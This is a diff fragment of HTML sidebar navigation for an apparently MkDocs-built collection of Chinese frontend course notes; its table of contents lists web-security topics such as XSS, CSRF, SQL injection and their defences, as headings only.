+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-kaikeba-frontend
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    01 性能优化
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02%20%E5%89%8D%E7%AB%AF%E6%B5%8B%E8%AF%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    02 前端测试
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03%20%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    03 设计模式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    04 数据结构与算法
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05%20%E9%9D%A2%E8%AF%95%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    05 面试题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06%20%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    06 面试技巧
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07%20%E9%A1%B9%E7%9B%AE%E8%AF%BE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    07 项目课
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    08-React预习笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../09-React%E9%9D%A2%E8%AF%95%E9%A2%98/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    09-React面试题
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-React%E7%BB%84%E4%BB%B6%E5%8C%96/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-React组件化
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    11-自动化测试
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../12-webpack-01/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    12-webpack-01
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../13-webpack-02/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    13-webpack-02
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../14-webpack-03/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    14-webpack-03
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../15-webpack%E4%BC%98%E5%8C%96%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    15-webpack优化笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../16-webpack%E4%BC%98%E5%8C%96%E5%AE%98%E6%96%B9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    16-webpack优化官方
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../17-webpack-05/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    17-webpack-05
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../18-webpack-06/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    18-webpack-06
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    19-前端安全-常见Web攻击
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    19-前端安全-常见Web攻击
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      课堂⽬标
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      知识要点
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="知识要点">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      1、XSS
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS攻击分类
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss-scripting" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS攻击的危害 - Scripting能干啥就能干啥
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS 防范⼿段
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XSS 防范⼿段">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#head" class="md-nav__link">
+    <span class="md-ellipsis">
+      HEAD
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      转义字符
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      黑名单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      ⽩名单
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httponly-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      HttpOnly Cookie
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      2、CSRF
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2、CSRF">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#csrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      CSRF攻击危害
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-clickjacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      3、点击劫持 - clickjacking
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3、点击劫持 - clickjacking">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL注⼊
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SQL注⼊">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      防御
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#os" class="md-nav__link">
+    <span class="md-ellipsis">
+      OS注⼊
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      请求劫持
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ddos" class="md-nav__link">
+    <span class="md-ellipsis">
+      DDOS
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../20-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    20-前端安全-防御手段
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-netease-senior-frontend
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-netease-senior-frontend
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/02-v8%E5%BC%95%E6%93%8E%E5%9B%9E%E6%94%B6%E5%86%85%E5%AD%98%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    02-v8引擎回收内存简介
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/03-node%E4%B8%8B%E9%9D%A2%E7%9A%84Restful%E5%AE%9E%E7%8E%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    03-node下面的Restful实现
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/04-%E7%BC%96%E7%A8%8B%E6%80%9D%E6%83%B3%E7%9A%84%E6%8F%90%E5%8D%87%E2%80%94%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E6%88%91%E4%BB%AC%E4%BB%A3%E7%A0%81%E7%9A%84%E5%8F%AF%E6%89%A9%E5%B1%95%E6%80%A7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    04-编程思想的提升—如何提高我们代码的可扩展性
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/06-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E5%8E%9F%E7%90%86%E5%92%8Cssr/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    06-浏览器渲染原理和ssr
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/07-%E7%BD%91%E6%98%93%E7%9C%9F%E5%AE%9E%E9%A1%B9%E7%9B%AEwebpack%E9%85%8D%E7%BD%AE%E8%A7%A3%E6%9E%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    07-网易真实项目webpack配置解析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/08-%E4%BB%8E%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90API%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    08-从架构分析API层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/09-%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%B4%A3%E4%BA%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%86%85%E5%AE%B9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    09-前端负责人的工作内容
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/10-%E5%88%86%E6%9E%90%E6%BA%90%E7%A0%81%E5%AD%A6%E6%9E%B6%E6%9E%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    10-分析源码学架构
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/11-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E9%AB%98%E8%B4%A8%E9%87%8F%E4%BB%A3%E7%A0%81/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    11-设计模式高质量代码
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/12-nodeJS%2BMongoDB%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    12-nodeJS+MongoDB登录系统
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/12-nodejs-mongodb-mongoose/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    12-nodejs-mongodb-mongoose
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/13-%E4%BD%BF%E7%94%A8VUE%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    13-使用VUE创建组件（没学完）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/16-%E6%9E%84%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E8%84%9A%E6%89%8B%E6%9E%B6%E5%B7%A5%E5%85%B7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    16-构建自己的脚手架工具
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/17-webpack%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    17-webpack编译原理分析
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/20-%E7%BB%84%E4%BB%B6%E5%B0%81%E8%A3%85%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD-VUE%EF%BC%88%E6%B2%A1%E5%AD%A6%E5%AE%8C%EF%BC%89/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    20-组件封装的基本技能-VUE（没学完）
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/21-ssr/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    21-ssr
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/24-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%A6%82%E4%BD%95%E5%81%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    24-单元测试如何做
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    25-基于NodeJS打造Web架构中间层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-netease-senior-frontend/readme/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    readme
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-network-basic
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-network-basic
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    01 概述
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/02%20%E7%89%A9%E7%90%86%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    02 物理层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/03%20%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    03 数据链路层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    04 网络层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    05 运输层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/06%20%E5%BA%94%E7%94%A8%E5%B1%82/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    06 应用层
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/readme/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    readme
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-network-basic/todo%20%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8-%E9%98%AE%E4%B8%80%E5%B3%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    todo 互联网协议入门-阮一峰
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-qianfeng-express
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-qianfeng-express
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-qianfeng-express/01.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    01
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ebook-upguigu-nodejs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            ebook-upguigu-nodejs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ebook-upguigu-nodejs/nodeJS-basic.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    nodeJS-basic
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    index
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    other
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            other
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/H5C3%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    H5C3从入门到精通
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/JS%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JS 数据结构
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/data%20structure%20basic/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    data structure basic
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/express%E5%9B%BE%E4%B9%A6%E9%A6%86%E9%A1%B9%E7%9B%AE/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    express图书馆项目
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    代码整洁之道 读书笔记
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E5%85%B6%E4%BB%96%E4%B9%A6%E5%8D%95/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    其他书单
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E7%AC%94%E8%AE%B0-%E9%98%AE%E4%B8%80%E5%B3%B0/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    前端工程化笔记-阮一峰
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    尚硅谷-React技术全家桶2021版笔记01
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B002/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    尚硅谷-React技术全家桶2021版笔记02
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../other/%E7%B2%BE%E8%AF%BB-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JS%E4%B8%8A%E5%8D%B7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    精读-你不知道的JS上卷
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
